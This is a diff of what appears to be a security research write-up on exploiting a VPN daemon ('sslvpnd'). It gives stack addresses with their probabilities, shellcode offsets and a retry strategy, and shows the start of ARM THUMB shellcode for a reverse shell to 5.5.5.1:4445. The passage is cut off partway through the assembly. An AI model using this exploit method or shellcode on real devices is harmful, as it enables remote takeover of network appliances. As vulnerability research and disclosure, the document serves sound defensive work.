@@ -205,27 +205,36 @@ That means all that is required to gain arbitrary code execution is to place she
 > Figure 5: Shellcode
 
 As we control the content of the `PACKET_IN`, that seems to be a perfect candidate to place a shellcode. From our observation it seems stack addresses are very lightly randomized due to the use of threads being used.
-Strangely, it seems that our buffer address remains constant, as part of the stack is not always randomised, while some other parts are. Although this is fantastic for exploitation, we're baffled by this and have no idea why it happens. Any comments on this are welcome!
+
+When we take control of the execution, our `$sp` register will be pointing to one of the following stack addresses:
+
+* `0x704aebe8` with about 65% chance
+* `0x704f6be8` with about 35% chance
+
+This is a very weird behaviour which we have never encountered! Usually randomisation on a 32 bit Linux kernel is very light, with about 12 bits of entropy. However, that's still 4096 possibilities, and here we only have two! If you know why this behaviour occurs, please let us know.
+
+Another sort-of-mystery is that we're executing on the stack, and typically in ARM and MIPS CPU architectures we have to flush the instruction and data caches before we execute our shellcode (see [this advisory](https://github.com/pedrib/PoC/blob/master/advisories/netgear-wnr2000.txt#L318) for an explanation and example).
+
+In our case, we got lucky and don't need to flush them! We speculate that this might be because `sslvpnd` has multiple threads running, and several of those are continuously calling `nanosleep()`, which flushes the caches for us.
 
 # Exploitation
 ## Shellcode
 
-Our shellcode is a TCP reverse shell to 5.5.5.1:4445 using an `execve()` syscall with no null bytes.
-The shellcode starts with `dsb` and `isb` instructions that should deal with D-cache and I-cache flush on ARMv7. This is necessary to ensure the CPU can see our shellcode on the stack after we take control of the execution. Afterwards the shellcode switches to thumb mode, which allows us to write a more compact and easily null free shellcode.
+Our shellcode is a TCP reverse shell to 5.5.5.1:4445 using an `execve()` syscall with no null bytes. We use THUMB mode shellcode to make it more compact.
 
 When constructing shellcode, we have to keep in mind that it is processed by `strncat()`. Therefore, it can not contain any null bytes. That's why the command string is terminated with an "X" character, which is then replaced with a null byte in the instruction `strb r2, [r0, #7]`.  
+
+Given the stack layout, our shellcode will be located about `0x12a` from the `$sp` values discussed in the previous section.
+We noticed that by adding a few more filler bytes to the request we can get slightly higher reliability, but as discussed previously, there are two possible stack values when we take control. 
+
+We decided to place our shellcode at offset `0x1b0` from the most common `$sp` value discussed in the previous section (`0x704aebe8`). This means our exploit will only have 65% reliability, but that is good enough given that the `sslvpnd` automagically restarts in less than 30 seconds if our exploit fails, so we can just try again until it works.
+
+We sacrifice reliability to have to a simpler exploit without the need for ROP, which is difficult (but not impossible) given the null byte constraints.
 
 ```nasm
 // Taken from Azeria's website and slightly modified
 .global _start
 _start:
- .ARM
-// Clear cache
- dsb
- isb
- add   r3, pc, #1       // switch to thumb mode
- bx    r3
-
 .THUMB
 // socket(2, 1, 0)
  mov   r0, #2
